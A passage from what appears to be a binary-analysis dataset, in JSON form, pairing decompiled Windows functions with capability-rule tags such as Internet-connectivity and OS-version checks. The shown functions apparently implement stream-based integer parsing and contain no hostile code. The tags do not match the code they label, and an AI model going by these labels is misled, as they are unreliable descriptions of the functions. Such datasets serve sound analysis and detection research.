= 0xffffffff;\n                        if (piVar4[3] <= piVar4[2]) goto code_r0x00014004d888;\ncode_r0x00014004d490:\n                        bVar23 = false;\n                    }\n                    bVar14 = piStack120 != NULL && iStack112 == -1;\n                    bVar22 = iStack112 == -1;\n                    if (bVar14) {\n                        if ((piStack120[2] < piStack120[3]) || (iVar8 = (**(*piStack120 + 0x48))(),  iVar8 != -1)) {\n                            bVar22 = false;\n                        }\n                        else {\n                            piStack120 = NULL;\n                            bVar22 = bVar14;\n                        }\n                    }\n                    if (bVar23 == bVar22) {\n                        uVar5 = 1;\n                        goto code_r0x00014004d4bb;\n                    }\n                    if (piStack104 == NULL) {\ncode_r0x00014004d8d0:\n                        uVar7 = 0xffffffff;\n                    }\n                    else if (piStack104[2] < piStack104[3]) {\n                        uVar7 = *piStack104[2];\n                    }\n                    else {\n                        uVar7 = (**(*piStack104 + 0x48))();\n                        if (uVar7 == 0xffffffff) {\n                            piStack104 = NULL;\n                            goto code_r0x00014004d8d0;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar13 = *(iVar9 + 0x20);\n                }\n                uVar5 = 0;\n            }\ncode_r0x00014004d4bb:\n            uStack136 = uVar15;\n            if (uVar15 == 0x10) goto code_r0x00014004d6c6;\n        }\n        else {\n            bVar21 = false;\n            uVar7 = 0;\n            iVar19 = 0;\n            bVar3 = false;\n            uStack136 = uVar15;\n        }\n    }\n    else {\n        uVar15 = 10;\n        if (uVar16 != 8) goto code_r0x00014004d378;\n        uVar15 = 0x10;\n        uVar5 = fcn.140029dd0(&piStack104, &piStack120);\n        if (uVar5 == 0) goto code_r0x00014004d39c;\n        bVar21 = false;\n        uVar7 = 0;\n        iVar19 = 0;\n        bVar3 = false;\ncode_r0x00014004d6c6:\n        uStack136 = 0x10;\n        uVar15 = 0x16;\n    }\ncode_r0x00014004d4d2:\n    ppiStack144 = &piStack104;\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar9 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    uVar20 = *(iVar9 + 0x88);\n    uVar16 = 0xffffffff / uStack136;\n    if (uVar20 == 0) {\n        uStack131 = 0;\n        if (uVar5 == 0) {\n            cStack152 = uVar15;\n            uVar17 = 0;\ncode_r0x00014004d534:\n            cVar6 = uVar7;\n            uVar7 = cVar6;\n            if (uVar15 < 0xb) {\n                if ((cVar6 < '0') || (cStack152 + '0' <= cVar6)) goto code_r0x00014004d792;\n            }\n            else if (9 < cVar6 - 0x30U) goto code_r0x00014004d77b;\n            uVar18 = uVar7 - 0x30;\n            do {\n                while( true ) {\n                    piVar4 = piStack104;\n                    if (uVar16 < uVar17) {\n                        uStack131 = 1;\n                    }\n                    else {\n                        uVar7 = uVar17 * uStack136;\n                        uVar17 = uVar18 + uVar7;\n                        uStack131 = uStack131 | CARRY4(uVar18, uVar7);\n                        iVar19 = iVar19 + 1;\n                    }\n                    uVar10 = piStack104[3];\n                    if (piStack104[2] < uVar10) {\n                        uVar11 = piStack104[2] + 1;\n                        piStack104[2] = uVar11;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uVar11 = piVar4[2];\n                        uVar10 = piVar4[3];\n                    }\n                    uStack96 = 0xffffffff;\n                    bVar23 = false;\n                    if (uVar10 <= uVar11) {\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 == -1) {\n                            piStack104 = NULL;\n                        }\n                        bVar23 = iVar8 == -1;\n                    }\n                    bVar22 = iStack112 == -1;\n                    if (((piStack120 != NULL) && (bVar22)) && (bVar22 = false,  piStack120[3] <= piStack120[2])) {\n                        iVar8 = (**(*piStack120 + 0x48))();\n                        bVar22 = iVar8 == -1;\n                        if (bVar22) {\n                            piStack120 = NULL;\n                        }\n                    }\n                    if (bVar22 == bVar23) {\n                        uVar2 = uVar5;\n                        uVar20 = 1;\n                        goto code_r0x00014004d5d6;\n                    }\n                    if (piStack104 != NULL) break;\n                    if (uVar15 < 0xb) goto code_r0x00014004d792;\n                    cVar6 = -1;\n                    uVar7 = 0xffffffff;\ncode_r0x00014004d944:\n                    if (5 < cVar6 + 0xbfU) goto code_r0x00014004d792;\n                    uVar18 = uVar7 - 0x37;\n                }\n                if (piStack104[2] < piStack104[3]) {\n                    uVar7 = *piStack104[2];\n                    goto code_r0x00014004d534;\n                }\n                uVar7 = (**(*piStack104 + 0x48))();\n                if (uVar7 != 0xffffffff) goto code_r0x00014004d534;\n                piStack104 = NULL;\n                if (uVar15 < 0xb) goto code_r0x00014004d792;\n                cVar6 = -1;\ncode_r0x00014004d77b:\n                if (5 < cVar6 + 0x9fU) goto code_r0x00014004d944;\n                uVar18 = uVar7 - 0x57;\n                if (uVar7 == 0x56) goto code_r0x00014004d792;\n            } while( true );\n        }\n        uVar17 = 0;\n        uVar2 = 0;\n        uVar20 = uVar5;\ncode_r0x00014004d5d6:\n        uVar5 = uVar2;\n        uVar2 = uVar20;\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014004d5e6;\ncode_r0x00014004d7a5:\n        uVar20 = uVar2;\n        fcn.14007da40(aiStack80, iVar19);\n        cVar6 = fcn.1400b76a0(*(iVar9 + 0x10), *(iVar9 + 0x18), aiStack80);\n        if (cVar6 == '\\0') {\n            *in_stack_00000030 = 4;\n        }\n        if (((iVar19 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x00014004d7e9;\n    }\n    else {\n        if (uVar5 != 0) {\n            uStack131 = 0;\n            uVar17 = 0;\n            uVar2 = 0;\n            uVar20 = uVar5;\n            goto code_r0x00014004d5d6;\n        }\n        uVar2 = *(iVar9 + 0x20);\n        uStack131 = 0;\n        uVar17 = 0;\n        if ((uVar2 != 0) && (*(iVar9 + 0x49) == uVar7)) goto code_r0x00014004da51;\n        while ((*(iVar9 + 0x48) != uVar7 && (iVar12 = sub.msvcrt.dll_memchr(iVar9 + 0x72, uVar7, uVar15),  iVar12 != 0))\n              ) {\n            uVar7 = iVar12 - (iVar9 + 0x72);\n            if (0xf < uVar7) {\n                uVar7 = uVar7 - 6;\n            }\n            uVar2 = uVar20;\n            if (uVar17 <= uVar16) {\n                uVar18 = uVar17 * uStack136;\n                uVar17 = uVar7 + uVar18;\n                iVar19 = iVar19 + 1;\n                uVar2 = uStack131 | CARRY4(uVar7, uVar18);\n            }\n            while( true ) {\n                uStack131 = uVar2;\n                piVar4 = piStack104;\n                uVar10 = piStack104[3];\n                if (piStack104[2] < uVar10) {\n                    uVar11 = piStack104[2] + 1;\n                    piStack104[2] = uVar11;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    uVar11 = piVar4[2];\n                    uVar10 = piVar4[3];\n                }\n                uStack96 = 0xffffffff;\n                bStack130 = false;\n                if (uVar10 <= uVar11) {\n                    iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar8 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bStack130 = iVar8 == -1;\n                }\n                bVar23 = iStack112 == -1;\n                if (((piStack120 != NULL) && (bVar23)) && (bVar23 = false,  piStack120[3] <= piStack120[2])) {\n                    iVar8 = (**(*piStack120 + 0x48))();\n                    bVar23 = iVar8 == -1;\n                    if (bVar23) {\n                        piStack120 = NULL;\n                    }\n                }\n                uVar2 = uVar5;\n                if (bStack130 == bVar23) goto code_r0x00014004d5d6;\n                uVar7 = fcn.140029e90(ppiStack144);\n                uVar2 = *(iVar9 + 0x20);\n                if ((uVar2 == 0) || (*(iVar9 + 0x49) != uVar7)) break;\ncode_r0x00014004da51:\n                if (iVar19 == 0) {\n                    uVar20 = 0;\n                    goto code_r0x00014004d5d6;\n                }\n                fcn.14007da40(aiStack80, iVar19);\n                iVar19 = 0;\n                uVar2 = uStack131;\n            }\n        }\ncode_r0x00014004d792:\n        uVar20 = 0;\n        uVar2 = 0;\n        if (*(aiStack80[0] + -0x18) != 0) goto code_r0x00014004d7a5;\ncode_r0x00014004d5e6:\n        if ((iVar19 != 0) || (bVar3)) {\ncode_r0x00014004d7e9:\n            if (uVar5 == 0) {\n                if (uStack131 == 0) {\n                    if (bVar21) {\n                        uVar17 = -uVar17;\n                    }\n                    *in_stack_00000038 = uVar17;\n                }\n                else {\n                    *in_stack_00000038 = 0xffffffff;\n                    *in_stack_00000030 = 4;\n                }\n                goto code_r0x00014004d615;\n            }\n        }\n    }\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x00014004d615:\n    if (uVar20 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, uStack96);\n    if (**0x14010fc90 == 0) {\n        iVar19 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar19 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar19 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar19 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4425
    },
    "14004dcd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.14004dcd0(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint32_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    char cVar12;\n    bool bVar13;\n    int32_t iVar14;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    uint8_t uVar20;\n    bool bVar21;\n    bool bVar22;\n    bool bVar23;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint16_t *in_stack_00000038;\n    uint16_t uStack156;\n    char cStack152;\n    int64_t **ppiStack144;\n    uint32_t uStack136;\n    uint8_t uStack131;\n    bool bStack130;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar8 = fcn.140026e80(in_stack_00000028 + 0xd0);\n    uVar17 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar17 == 0x40) {\n        uVar15 = 8;\ncode_r0x00014004dd38:\n        uVar5 = fcn.140029dd0(&piStack104, &piStack120);\n        if (uVar5 == 0) {\ncode_r0x00014004dd5c:\n            ppiStack144 = &piStack104;\n            uVar7 = fcn.140029e90(ppiStack144);\n            cVar6 = uVar7;\n            bVar21 = *(iVar8 + 0x6e) == cVar6;\n            if ((bVar21) || (*(iVar8 + 0x6f) == cVar6)) {\n                cVar12 = *(iVar8 + 0x20);\n                if (((cVar12 != '\\0') && (*(iVar8 + 0x49) == cVar6)) || (*(iVar8 + 0x48) == cVar6))\n                goto code_r0x00014004ddc6;\n                fcn.14009b630(piStack104);\n                uStack96 = 0xffffffff;\n                uVar5 = fcn.140029dd0(ppiStack144, &piStack120);\n                if (uVar5 == 0) {\n                    uVar7 = fcn.140029e90(ppiStack144);\n                    cVar12 = *(iVar8 + 0x20);\n                    goto code_r0x00014004ddc6;\n                }\n                iVar19 = 0;\n                bVar3 = false;\n            }\n            else {\n                bVar21 = false;\n                cVar12 = *(iVar8 + 0x20);\ncode_r0x00014004ddc6:\n                iVar19 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar6 = uVar7,  cVar12 == '\\0' || (*(iVar8 + 0x49) != cVar6)) &&\n                       (*(iVar8 + 0x48) != cVar6))) {\n                    if (*(iVar8 + 0x72) == cVar6) {\n                        bVar3 = bVar3 ^ 1U | uVar15 == 10;\n                        if (!bVar3) goto code_r0x00014004ddf3;\n                        bVar23 = uVar15 == 8;\n                        if (bVar23 || uVar17 == 0) {\n                            iVar19 = 0;\n                            uVar15 = 8;\n                            bVar3 = bVar23 || uVar17 == 0;\n                        }\n                        else {\n                            iVar19 = iVar19 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x00014004ddf3:\n                        if ((*(iVar8 + 0x70) != cVar6) && (*(iVar8 + 0x71) != cVar6)) {\n                            uVar5 = 0;\n                            bVar3 = true;\n                            goto code_r0x00014004de7b;\n                        }\n                        uVar5 = uVar17 == 0 || uVar15 == 0x10;\n                        if (uVar17 != 0 && uVar15 != 0x10) {\n                            bVar3 = true;\n                            uStack136 = uVar15;\n                            goto code_r0x00014004de92;\n                        }\n                        iVar19 = 0;\n                        uVar15 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar9 = piStack104[2] + 1;\n                        uStack96 = 0xffffffff;\n                        piStack104[2] = uVar9;\n                        if (uVar9 < piStack104[3]) goto code_r0x00014004de50;\ncode_r0x00014004e250:\n                        uStack96 = 0xffffffff;\n                        iVar18 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar18 != -1) goto code_r0x00014004de50;\n                        piStack104 = NULL;\n                        bVar23 = true;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uStack96 = 0xffffffff;\n                        if (piVar4[3] <= piVar4[2]) goto code_r0x00014004e250;\ncode_r0x00014004de50:\n                        bVar23 = false;\n                    }\n                    bVar13 = piStack120 != NULL && iStack112 == -1;\n                    bVar22 = iStack112 == -1;\n                    if (bVar13) {\n                        if ((piStack120[2] < piStack120[3]) || (iVar18 = (**(*piStack120 + 0x48))(),  iVar18 != -1)) {\n                            bVar22 = false;\n                        }\n                        else {\n                            piStack120 = NULL;\n                            bVar22 = bVar13;\n                        }\n                    }\n                    if (bVar23 == bVar22) {\n                        uVar5 = 1;\n                        goto code_r0x00014004de7b;\n                    }\n                    if (piStack104 == NULL) {\ncode_r0x00014004e290:\n                        uVar7 = 0xffffffff;\n                    }\n                    else if (piStack104[2] < piStack104[3]) {\n                        uVar7 = *piStack104[2];\n                    }\n                    else {\n                        uVar7 = (**(*piStack104 + 0x48))();\n                        if (uVar7 == 0xffffffff) {\n                            piStack104 = NULL;\n                            goto code_r0x00014004e290;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar12 = *(iVar8 + 0x20);\n                }\n                uVar5 = 0;\n            }\ncode_r0x00014004de7b:\n            uStack136 = uVar15;\n            if (uVar15 == 0x10) goto code_r0x00014004e086;\n        }\n        else {\n            bVar21 = false;\n            uVar7 = 0;\n            iVar19 = 0;\n            bVar3 = false;\n            uStack136 = uVar15;\n        }\n    }\n    else {\n        uVar15 = 10;\n        if (uVar17 != 8) goto code_r0x00014004dd38;\n        uVar15 = 0x10;\n        uVar5 = fcn.140029dd0(&piStack104, &piStack120);\n        if (uVar5 == 0) goto code_r0x00014004dd5c;\n        bVar21 = false;\n        uVar7 = 0;\n        iVar19 = 0;\n        bVar3 = false;\ncode_r0x00014004e086:\n        uStack136 = 0x10;\n        uVar15 = 0x16;\n    }\ncode_r0x00014004de92:\n    ppiStack144 = &piStack104;\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar8 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    uVar20 = *(iVar8 + 0x88);\n    uStack156 = 0xffff / uStack136;\n    if (uVar20 == 0) {\n        uStack131 = 0;\n        if (uVar5 == 0) {\n            cStack152 = uVar15;\n            iVar18 = 0;\ncode_r0x00014004def4:\n            uVar16 = iVar18;\n            cVar6 = uVar7;\n            uVar7 = cVar6;\n            if (uVar15 < 0xb) {\n                if ((cVar6 < '0') || (cStack152 + '0' <= cVar6)) goto code_r0x00014004e154;\n            }\n            else if (9 < cVar6 - 0x30U) goto code_r0x00014004e13c;\n            iVar14 = uVar7 - 0x30;\n            do {\n                while( true ) {\n                    piVar4 = piStack104;\n                    if (uStack156 < iVar18) {\n                        uStack131 = 1;\n                    }\n                    else {\n                        uVar17 = iVar18 * uStack136;\n                        uStack131 = uStack131 | 0xffff - iVar14 < uVar17;\n                        iVar18 = uVar17 + iVar14;\n                        iVar19 = iVar19 + 1;\n                    }\n                    uVar16 = iVar18;\n                    uVar9 = piStack104[3];\n                    if (piStack104[2] < uVar9) {\n                        uVar10 = piStack104[2] + 1;\n                        piStack104[2] = uVar10;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uVar10 = piVar4[2];\n                        uVar9 = piVar4[3];\n                    }\n                    uStack96 = 0xffffffff;\n                    bVar23 = false;\n                    if (uVar9 <= uVar10) {\n                        iVar14 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar14 == -1) {\n                            piStack104 = NULL;\n                        }\n                        bVar23 = iVar14 == -1;\n                    }\n                    bVar22 = iStack112 == -1;\n                    if (((piStack120 != NULL) && (bVar22)) && (bVar22 = false,  piStack120[3] <= piStack120[2])) {\n                        iVar14 = (**(*piStack120 + 0x48))();\n                        bVar22 = iVar14 == -1;\n                        if (bVar22) {\n                            piStack120 = NULL;\n                        }\n                    }\n                    if (bVar22 == bVar23) {\n                        uVar2 = uVar5;\n                        uVar20 = 1;\n                        goto code_r0x00014004dfa0;\n                    }\n                    if (piStack104 != NULL) break;\n                    if (uVar15 < 0xb) goto code_r0x00014004e154;\n                    uVar7 = 0xffffffff;\n                    cVar6 = -1;\ncode_r0x00014004e304:\n                    uVar16 = iVar18;\n                    if (5 < cVar6 + 0xbfU) goto code_r0x00014004e154;\n                    iVar14 = uVar7 - 0x37;\n                }\n                if (piStack104[2] < piStack104[3]) {\n                    uVar7 = *piStack104[2];\n                    goto code_r0x00014004def4;\n                }\n                uVar7 = (**(*piStack104 + 0x48))();\n                if (uVar7 != 0xffffffff) goto code_r0x00014004def4;\n                piStack104 = NULL;\n                if (uVar15 < 0xb) goto code_r0x00014004e154;\n                cVar6 = -1;\ncode_r0x00014004e13c:\n                uVar16 = iVar18;\n                if (5 < cVar6 + 0x9fU) goto code_r0x00014004e304;\n                iVar14 = uVar7 - 0x57;\n                if (uVar7 == 0x56) goto code_r0x00014004e154;\n            } while( true );\n        }\n        uVar16 = 0;\n        uVar2 = 0;\n        uVar20 = uVar5;\ncode_r0x00014004dfa0:\n        uVar5 = uVar2;\n        uVar2 = uVar20;\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014004dfb0;\ncode_r0x00014004e167:\n        uVar20 = uVar2;\n        fcn.14007da40(aiStack80, iVar19);\n        cVar6 = fcn.1400b76a0(*(iVar8 + 0x10), *(iVar8 + 0x18), aiStack80);\n        if (cVar6 == '\\0') {\n            *in_stack_00000030 = 4;\n        }\n        if (((iVar19 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x00014004e1ab;\n    }\n    else {\n        if (uVar5 != 0) {\n            uStack131 = 0;\n            uVar16 = 0;\n            uVar2 = 0;\n            uVar20 = uVar5;\n            goto code_r0x00014004dfa0;\n        }\n        uVar2 = *(iVar8 + 0x20);\n        uStack131 = 0;\n        iVar18 = 0;\n        if ((uVar2 != 0) && (*(iVar8 + 0x49) == uVar7)) goto code_r0x00014004e41b;\n        while ((uVar16 = iVar18,  *(iVar8 + 0x48) != uVar7 && (iVar11 = sub.msvcrt.dll_memchr(),  iVar11 != 0))) {\n            iVar14 = iVar11 - (iVar8 + 0x72);\n            if (0xf < iVar14) {\n                iVar14 = iVar14 + -6;\n            }\n            uVar2 = uVar20;\n            if (uVar16 <= uStack156) {\n                iVar18 = uVar16 * uStack136 + iVar14;\n                iVar19 = iVar19 + 1;\n                uVar2 = uStack131 | 0xffff - iVar14 < uVar16 * uStack136;\n            }\n            while( true ) {\n                uStack131 = uVar2;\n                piVar4 = piStack104;\n                uVar16 = iVar18;\n                uVar9 = piStack104[3];\n                if (piStack104[2] < uVar9) {\n                    uVar10 = piStack104[2] + 1;\n                    piStack104[2] = uVar10;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    uVar10 = piVar4[2];\n                    uVar9 = piVar4[3];\n                }\n                uStack96 = 0xffffffff;\n                bStack130 = false;\n                if (uVar9 <= uVar10) {\n                    iVar14 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar14 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bStack130 = iVar14 == -1;\n                }\n                bVar23 = iStack112 == -1;\n                if (((piStack120 != NULL) && (bVar23)) && (bVar23 = false,  piStack120[3] <= piStack120[2])) {\n                    iVar14 = (**(*piStack120 + 0x48))();\n                    bVar23 = iVar14 == -1;\n                    if (bVar23) {\n                        piStack120 = NULL;\n                    }\n                }\n                uVar2 = uVar5;\n                if (bStack130 == bVar23) goto code_r0x00014004dfa0;\n                uVar7 = fcn.140029e90(ppiStack144);\n                uVar2 = *(iVar8 + 0x20);\n                if ((uVar2 == 0) || (*(iVar8 + 0x49) != uVar7)) break;\ncode_r0x00014004e41b:\n                uVar16 = iVar18;\n                if (iVar19 == 0) {\n                    uVar20 = 0;\n                    goto code_r0x00014004dfa0;\n                }\n                fcn.14007da40(aiStack80, iVar19);\n                iVar19 = 0;\n                uVar2 = uStack131;\n            }\n        }\ncode_r0x00014004e154:\n        uVar20 = 0;\n        uVar2 = 0;\n        if (*(aiStack80[0] + -0x18) != 0) goto code_r0x00014004e167;\ncode_r0x00014004dfb0:\n        if ((iVar19 != 0) || (bVar3)) {\ncode_r0x00014004e1ab:\n            if (uVar5 == 0) {\n                if (uStack131 == 0) {\n                    if (bVar21) {\n                        uVar16 = -uVar16;\n                    }\n                    *in_stack_00000038 = uVar16;\n                }\n                else {\n                    *in_stack_00000038 = 0xffff;\n                    *in_stack_00000030 = 4;\n                }\n                goto code_r0x00014004dfe0;\n            }\n        }\n    }\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x00014004dfe0:\n    if (uVar20 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, uStack96);\n    if (**0x14010fc90 == 0) {\n        iVar19 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar19 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar19 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar19 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4438
    },
    "14004e69": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.14004e690(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    char cVar14;\n    bool bVar15;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar16;\n    int32_t iVar17;\n    uint32_t uVar18;\n    uint64_t uVar19;\n    uint64_t uVar20;\n    uint8_t uVar21;\n    bool bVar22;\n    bool bVar23;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint64_t *in_stack_00000038;\n    char cStack152;\n    int64_t **ppiStack144;\n    uint8_t uStack131;\n    bool bStack130;\n    bool bStack129;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar9 = fcn.140026e80(in_stack_00000028 + 0xd0);\n    uVar18 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar18 == 0x40) {\n        uVar16 = 8;\ncode_r0x00014004e6f8:\n        uVar5 = fcn.140029dd0(&piStack104, &piStack120);\n        if (uVar5 == 0) {\ncode_r0x00014004e71c:\n            ppiStack144 = &piStack104;\n            uVar7 = fcn.140029e90(ppiStack144);\n            cVar6 = uVar7;\n            bStack130 = *(iVar9 + 0x6e) == cVar6;\n            if ((bStack130) || (*(iVar9 + 0x6f) == cVar6)) {\n                cVar14 = *(iVar9 + 0x20);\n                if (((cVar14 != '\\0') && (*(iVar9 + 0x49) == cVar6)) || (*(iVar9 + 0x48) == cVar6))\n                goto code_r0x00014004e786;\n                fcn.14009b630(piStack104);\n                uStack96 = 0xffffffff;\n                uVar5 = fcn.140029dd0(ppiStack144, &piStack120);\n                if (uVar5 == 0) {\n                    uVar7 = fcn.140029e90(ppiStack144);\n                    cVar14 = *(iVar9 + 0x20);\n                    goto code_r0x00014004e786;\n                }\n                iVar17 = 0;\n                bVar3 = false;\n            }\n            else {\n                bStack130 = false;\n                cVar14 = *(iVar9 + 0x20);\ncode_r0x00014004e786:\n                iVar17 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar6 = uVar7,  cVar14 == '\\0' || (*(iVar9 + 0x49) != cVar6)) &&\n                       (*(iVar9 + 0x48) != cVar6))) {\n                    if (*(iVar9 + 0x72) == cVar6) {\n                        bVar3 = bVar3 ^ 1U | uVar16 == 10;\n                        if (!bVar3) goto code_r0x00014004e7b3;\n                        bVar23 = uVar16 == 8;\n                        if (bVar23 || uVar18 == 0) {\n                            iVar17 = 0;\n                            uVar16 = 8;\n                            bVar3 = bVar23 || uVar18 == 0;\n                        }\n                        else {\n                            iVar17 = iVar17 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x00014004e7b3:\n                        if ((*(iVar9 + 0x70) != cVar6) && (*(iVar9 + 0x71) != cVar6)) {\n                            uVar5 = 0;\n                            bVar3 = true;\n                            goto code_r0x00014004e83b;\n                        }\n                        uVar5 = uVar18 == 0 || uVar16 == 0x10;\n                        if (uVar18 != 0 && uVar16 != 0x10) {\n                            bVar3 = true;\n                            uVar18 = uVar16;\n                            goto code_r0x00014004e850;\n                        }\n                        iVar17 = 0;\n                        uVar16 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar10 = piStack104[2] + 1;\n                        uStack96 = 0xffffffff;\n                        piStack104[2] = uVar10;\n                        if (uVar10 < piStack104[3]) goto code_r0x00014004e810;\ncode_r0x00014004ec58:\n                        uStack96 = 0xffffffff;\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 != -1) goto code_r0x00014004e810;\n                        piStack104 = NULL;\n                        bVar23 = true;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uStack96 = 0xffffffff;\n                        if (piVar4[3] <= piVar4[2]) goto code_r0x00014004ec58;\ncode_r0x00014004e810:\n                        bVar23 = false;\n                    }\n                    bVar15 = piStack120 != NULL && iStack112 == -1;\n                    bVar22 = iStack112 == -1;\n                    if (bVar15) {\n                        if ((piStack120[2] < piStack120[3]) || (iVar8 = (**(*piStack120 + 0x48))(),  iVar8 != -1)) {\n                            bVar22 = false;\n                        }\n                        else {\n                            piStack120 = NULL;\n                            bVar22 = bVar15;\n                        }\n                    }\n                    if (bVar22 == bVar23) {\n                        uVar5 = 1;\n                        goto code_r0x00014004e83b;\n                    }\n                    if (piStack104 == NULL) {\ncode_r0x00014004eca0:\n                        uVar7 = 0xffffffff;\n                    }\n                    else if (piStack104[2] < piStack104[3]) {\n                        uVar7 = *piStack104[2];\n                    }\n                    else {\n                        uVar7 = (**(*piStack104 + 0x48))();\n                        if (uVar7 == 0xffffffff) {\n                            piStack104 = NULL;\n                            goto code_r0x00014004eca0;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar14 = *(iVar9 + 0x20);\n                }\n                uVar5 = 0;\n            }\ncode_r0x00014004e83b:\n            uVar18 = uVar16;\n            if (uVar16 == 0x10) goto code_r0x00014004ea76;\n        }\n        else {\n            bStack130 = false;\n            uVar7 = 0;\n            iVar17 = 0;\n            bVar3 = false;\n            uVar18 = uVar16;\n        }\n    }\n    else {\n        uVar16 = 10;\n        if (uVar18 != 8) goto code_r0x00014004e6f8;\n        uVar16 = 0x10;\n        uVar5 = fcn.140029dd0(&piStack104, &piStack120);\n        if (uVar5 == 0) goto code_r0x00014004e71c;\n        bStack130 = false;\n        uVar7 = 0;\n        iVar17 = 0;\n        bVar3 = false;\ncode_r0x00014004ea76:\n        uVar16 = 0x16;\n        uVar18 = 0x10;\n    }\ncode_r0x00014004e850:\n    ppiStack144 = &piStack104;\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar9 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    uVar13 = uVar18;\n    uVar21 = *(iVar9 + 0x88);\n    